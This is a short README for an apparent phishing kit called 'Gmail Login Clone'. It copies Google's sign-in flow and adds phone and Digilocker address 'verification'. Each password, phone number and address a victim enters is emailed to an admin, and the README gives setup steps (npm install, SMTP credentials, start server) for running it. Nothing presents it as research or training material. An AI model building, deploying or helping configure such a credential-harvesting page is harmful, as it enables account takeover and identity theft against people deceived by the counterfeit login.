# Gmail Login Clone

A web application that mimics the Google Mail login process with additional verification steps for phone number and address using Digilocker.

## Features

- Email input (Gmail-like)
- Password input
- Phone number verification
- Address verification for Digilocker
- Email notifications sent to admin at each step

## Setup

1. Install dependencies: `npm install`
2. Configure email settings in `server.js`:
   - Replace `your-email@gmail.com` with your Gmail address
   - Replace `your-app-password` with your Gmail app password
   - Replace `admin-email@example.com` with the admin email address
3. Start the server: `npm start`
4. Open `http://localhost:3000` in your browser

## Note

This application sends emails to the admin for each user input step. Ensure SMTP settings are correctly configured for email delivery.# p11
